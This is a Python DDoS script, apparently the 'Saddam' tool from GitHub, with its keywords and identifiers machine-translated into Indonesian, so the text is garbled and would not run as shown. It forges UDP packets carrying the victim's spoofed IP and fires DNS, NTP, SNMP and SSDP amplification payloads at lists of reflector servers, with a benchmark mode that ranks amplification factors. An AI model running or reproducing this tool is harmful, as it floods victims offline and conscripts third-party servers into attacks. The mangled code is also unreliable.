#!/usr/bin/env python
 sistem impor
 waktu impor
 soket impor
 struktur impor
 benang impor
dari  randint impor acak  
dari  optparse impor OptionParser  
dari  pinject  import  IP , UDP

PENGGUNAAN  =  '''
%prog target.com [opsi] # DDoS
%prog benchmark [opsi] # Hitung faktor AMPLIFIKASI
'''

LOGO  =  r'''
	   _____ __ __              
	  / ___/____ _____/ /___/ /___ _____ ___ 
	  \__ \/ __ `/ __ / __ / __ `/ __ `__ \
	 _/ / /_/ / /_/ / /_/ / /_/ / / / / / /
	/____/\__,_/\__,_/\__,_/\__,_/_/ /_/ /_/ 
	https://github.com/vnta05/saddam
	   https://youtube.com/VNTAHURTED     
'''

BANTUAN  = (
	'File Amplifikasi DNS dan Domain untuk Diselesaikan (misalnya: dns.txt:[evildomain.com|domains_file.txt]' ,
	'File Amplifikasi NTP' ,
	'File Amplifikasi SNMP' ,
	'File Amplifikasi SSDP' ,
	'Jumlah utas (default=1)' )

PILIHAN  = (
	(( '-d' , '--dns' ), dict ( dest = 'dns' , metavar = 'FILE:FILE|DOMAIN' , help = HELP [ 0 ])),
	(( '-n' , '--ntp' ), dict ( dest = 'ntp' , metavar = 'FILE' , help = HELP [ 1 ])),
	(( '-s' , '--snmp' ), dict ( dest = 'snmp' , metavar = 'FILE' , help = HELP [ 2 ])),
	(( '-p' , '--ssdp' ), dict ( dest = 'ssdp' , metavar = 'FILE' , help = HELP [ 3 ])),
	(( '-t' , '--threads' ), dict ( dest = 'threads' , type = int , default = 1 , metavar = 'N' , help = HELP [ 4 ])) )

TANDA PASAR  = (
	'Protokol'
	'| Alamat IP '
	'| Amplifikasi '
	'| Domain '
	' \n {}' ). format ( '-' * 75 )

SERANGAN  = (
	'Terkirim'
	'| Lalu lintas '
	'| Paket/s '
	'| Sedikit/s '
	' \n {}' ). format ( '-' * 63 )

PELABUHAN  = {
	'dns' : 53 ,
	'ntp' : 123 ,
	'snmp' : 161 ,
	'ssdp' : 1900 }

BAYARAN  = {
	'dns' : ( '{} \x01 \x00 \x00 \x01 \x00 \x00 \x00 \x00 \x00 \x01 '
			'{} \x00 \x00 \xff \x00 \xff \x00 \x00 \x29 \x10 \x00 '
			' \x00 \x00 \x00 \x00 \x00 \x00 ' ),
	'snmp' :( ' \x30 \x26 \x02 \x01 \x01 \x04 \x06 \x70 \x75 \x62 \x6c '
		' \x69 \x63 \xa5 \x19 \x02 \x04 \x71 \xb4 \xb5 \x68 \x02 \x01 '
		' \x00 \x02 \x01 \x7F \x30 \x0b \x30 \x09 \x06 \x05 \x2b \x06 '
		' \x01 \x02 \x01 \x05 \x00 ' ),
	'ntp' :( ' \x17 \x00 \x02 \x2a ' + ' \x00 ' * 4 ),
	'ssdp' :( 'M-SEARCH * HTTP/1.1 \r \n HOST: 239.255.255.250:1900 \r \n '
		'MAN: "ssdp:discover" \r \n MX: 2 \r \n ST: ssdp:all \r \n \r \n ' )
}

amplifikasi  = {
	'dns' : {},
	'ntp' : {},
	'snmp' : {},
	'ssdp' : {} }		 # Faktor penguatan

FILE_NAME  =  0 			# Indeks nama file
FILE_HANDLE  =  1  		# Indeks deskriptor file

npackets  =  0 			# Jumlah paket yang dikirim
nbytes  =  0 				# Jumlah byte yang dipantulkan
file  = {}				 # File amplifikasi

SUFIKS  = {
	0 : '' ,
	1 : 'K' ,
	2 : 'M' ,
	3 : 'G' ,
	4 : 'T' }

def  Kalc ( n , d , satuan = '' ):
	saya  =  0
	r  =  mengapung ( n )
	sedangkan  r / d >= 1 :
		r  =  r / d
		saya +=  1
	kembalikan  '{:.2f}{}{}' . format ( r , SUFFIX [ i ], unit )

def  GetDomainList ( domain ):
	daftar_domain  = []

	jika  '.TXT'  dalam  domain . atas ():
		file  =  buka ( domain , 'r' )
		isi  =  file . baca ()
		file . tutup ()
		isi  =  isi . ganti ( ' \r ' , '' )
		isi  =  isi . ganti ( ' ' , '' )
		isi  =  isi . membagi ( ' \n ' )
		untuk  domain  dalam  konten :
			jika  domain :
				domain_daftar . tambahkan ( domain )
	lain :
		domain_list  =  domain . membagi ( ',' )
	kembali  domain_list

def  Monitor ():
	'''
		Pantau serangan
	'''
	cetak  SERANGAN
	FMT  =  '{:^15}|{:^15}|{:^15}|{:^15}'
	mulai  =  waktu . waktu ()
	sedangkan  Benar :
		coba :
			saat ini  =  waktu . waktu () -  mulai
			bps  = ( nbyte * 8 ) / saat ini
			pps  =  npackets / saat ini
			keluar  =  FMT . format ( Calc ( npackets , 1000 ),
				Calc ( nbytes , 1024 , 'B' ), Calc ( pps , 1000 , 'pps' ), Calc ( bps , 1000 , 'bps' ))
			sys . stderr . write ( ' \r {}{}' . format ( keluar , ' ' * ( 60 - len ( keluar ))))
			waktu . tidur ( 1 )
		kecuali  KeyboardInterrupt :
			cetak  ' \n terganggu'
			istirahat
		kecuali  Pengecualian  sebagai  err :
			print  ' \n Kesalahan:' , str ( err )
			istirahat
			

def  AmpFactor ( recvd , pengirimannya ):
	mengembalikan  '{}x ({}B -> {}B)' . format ( recvd / terkirim , terkirim , recvd )

def  Benchmark ( ddos ):
	cetak  BENCHMARK
	saya  =  0
	untuk  proto  dalam  file :
		f  =  buka ( file [ proto ][ FILE_NAME ], 'r' )
		sedangkan  Benar :
			tentara  =  f . garis baca (). strip ()
			jika  tentara :
				jika  proto == 'dns' :
					untuk  domain  di  ddos . domain :
						saya +=  1
						recvd , dikirim  =  ddos . GetAmpSize ( proto , tentara , domain )
						jika  recvd / dikirim :
							cetak  '{:^8}|{:^15}|{:^23}|{}' . format ( proto , prajurit ,
								AmpFactor ( recvd , pengirimannya ), domain )
						lain :
							terus
				lain :
					recvd , dikirim  =  ddos . GetAmpSize ( proto , tentara )
					cetak  '{:^8}|{:^15}|{:^23}|{}' . format ( proto , prajurit ,
						AmpFactor ( recvd , pengirimannya ), 'N / A' )
					saya +=  1
			lain :
				istirahat
		print  'Total yang diuji:' , i
		f . tutup ()

kelas  DDoS ( objek ):
	def  __init__ ( self , target , threads , domains , event ):
		diri . sasaran  =  sasaran
		diri . benang  =  benang =
		diri . acara  =  acara
		diri . domain  =  domain
	def  stres ( diri ):
		for  i  in  range ( self . threads ):
			t  =  benang . Utas ( target = diri sendiri . __attack )
			t . mulai ()
	def  __send ( self , sock , soldier , proto , payload ):
		'''
			Kirim Paket Palsu
		'''
		udp  =  UDP ( randint ( 1 , 65535 ), PORT [ proto ], payload ). pak ( diri . target , tentara )
		ip  =  IP ( diri . Target , tentara , udp , proto = socket . IPPROTO_UDP ). paket ()
		kaus kaki . sendto ( ip + udp + payload , ( tentara , PORT [ proto ])))
	def  GetAmpSize ( self , proto , soldier , domain = '' ):
		'''
			Dapatkan Ukuran Amplifikasi
		'''
		kaus kaki  =  soket . soket ( soket . AF_INET , soket . SOCK_DGRAM )
		kaus kaki . batas waktu yang ditentukan ( 2 )
		data  =  ''
		jika  proto  di [ 'ntp' , 'ssdp' ]:
			paket  =  PAYLOAD [ proto ]
			kaus kaki . sendto ( paket , ( tentara , PORT [ proto ])))
			coba :
				sedangkan  Benar :
					data +=  kaus kaki . recvfrom ( 65535 )[ 0 ]
			kecuali  soket . batas waktu :
				kaus kaki . tutup ()
				kembali  len ( data ), len ( paket )
		jika  proto == 'dns' :
			paket  =  sendiri . __GetDnsQuery ( domain )
		lain :
			paket  =  PAYLOAD [ proto ]
		coba :
			kaus kaki . sendto ( paket , ( tentara , PORT [ proto ])))
			data , _  =  kaus kaki . recvfrom ( 65535 )
		kecuali  soket . batas waktu :
			data  =  ''
		akhirnya :
			kaus kaki . tutup ()
		kembali  len ( data ), len ( paket )
	def  __GetQName ( self , domain ):
		'''
			QNAME Nama domain yang direpresentasikan sebagai urutan label 
			di mana setiap label terdiri dari panjang
			oktet diikuti oleh jumlah oktet itu
		'''
		label  =  domain . membagi ( '.' )
		QNama  =  ''
		untuk  label  di  label :
			jika  len ( label ):
				QName  +=  struct . pak ( 'B' , len ( label )) +  label
		kembali  QName
	def  __GetDnsQuery ( mandiri , domain ):
		id  =  struktur . paket ( 'H' , randint ( 0 , 65535 ))
		QName  =  diri sendiri . __GetQName ( domain )
		kembali  PAYLOAD [ 'dns' ]. format ( id , QName )
	def  __attack ( diri ):
		global yang  npackets
		 nbyte global
		_file  =  file
		untuk  proto  di  _files :	 # Buka file Amplifikasi
			f  =  buka ( _files [ proto ][ FILE_NAME ], 'r' )
			_file [ proto ]. tambahkan ( f )		 # _file = {'proto':['file_name', file_handle]}
		kaus kaki  =  soket . soket ( soket . AF_INET , soket . SOCK_RAW , soket . IPPROTO_RAW )
		saya  =  0
		sementara  diri . acara . isSet ():
			untuk  proto  di  _files :
				prajurit  =  _file [ proto ][ FILE_HANDLE ]. garis baca (). strip ()
				jika  tentara :
					jika  proto == 'dns' :
						jika  tidak  amplifikasi [ proto ]. has_key ( prajurit ):
							amplifikasi [ proto ][ tentara ] = {}
						untuk  domain  di  self . domain :
							jika  tidak  amplifikasi [ proto ][ tentara ]. has_key ( domain ):
								ukuran , _  =  sendiri . GetAmpSize ( proto , tentara , domain )
								jika  ukuran == 0 :
									istirahat
								 ukuran elif < len ( PAYLOAD [ proto ]):
									terus
								lain :
									amplifikasi [ proto ][ tentara ][ domain ] =  ukuran
							ampli  =  sendiri . __GetDnsQuery ( domain )
							diri . __send ( kaus kaki , tentara , proto , amp )
							npacket  +=  1
							saya += 1
							nbytes  +=  amplifikasi [ proto ][ tentara ][ domain ]
					lain :
						jika  tidak  amplifikasi [ proto ]. has_key ( prajurit ):
							ukuran , _  =  sendiri . GetAmpSize ( proto , tentara )
							jika  ukuran < len ( PAYLOAD [ proto ]):
								terus
							lain :
								amplifikasi [ proto ][ tentara ] =  ukuran
						amp  =  PAYLOAD [ proto ]
						npacket  +=  1
						saya += 1
						nbytes  +=  amplifikasi [ proto ][ tentara ]
						diri . __send ( kaus kaki , tentara , proto , amp )
				lain :
					_file [ proto ][ FILE_HANDLE ]. mencari ( 0 )
		kaus kaki . tutup ()
		untuk  proto  di  _files :
			_file [ proto ][ FILE_HANDLE ]. tutup ()

def  utama ():
	parser  =  OptionParser ( penggunaan = PENGGUNAAN )
	untuk  args , kwargs  di  OPTIONS :
		pengurai . add_option ( * args , ** kwargs )
	pilihan , args  =  parser . parse_args ()
	domain  =  Tidak ada
	jika  len ( args ) < 1 :
		pengurai . print_help ()
		sys . keluar ()
	jika  pilihan . dn :
		dns_file , domain  =  opsi . dns . berpisah ( ':' )
		domain  =  GetDomainList ( domain )
		jika  domain :
			file [ 'dns' ] = [ dns_file ]
		lain :
			print  'Tentukan domain untuk diselesaikan (mis: --dns=dns.txt:evildomain.com)'
			sys . keluar ()
	jika  pilihan . ntp :
		file [ 'ntp' ] = [ pilihan . ntp ]
	jika  pilihan . snmp :
		file [ 'snmp' ] = [ opsi . snmp ]
	jika  pilihan . ssdp :
		file [ 'ssdp' ] = [ opsi . ssdp ]
	jika  file :
		acara  =  threading . Acara ()
		acara . mengatur ()
		jika  'BENCHMARK' == argumen [ 0 ]. atas ():
			ddos  =  DDoS ( args [ 0 ], pilihan . benang , domain , acara )
			Tolok Ukur ( ddos )
		lain :
			ddos  =  DDoS ( socket . gethostbyname ( args [ 0 ]), pilihan . benang , domain , acara )
			ddos . stres ()
			Memantau ()
			acara . jelas ()
	lain :
		pengurai . print_help ()
		sys . keluar ()

if  __name__ == '__main__' :
	cetak  LOGO
	utama ()
© 2021 GitHub, Inc.

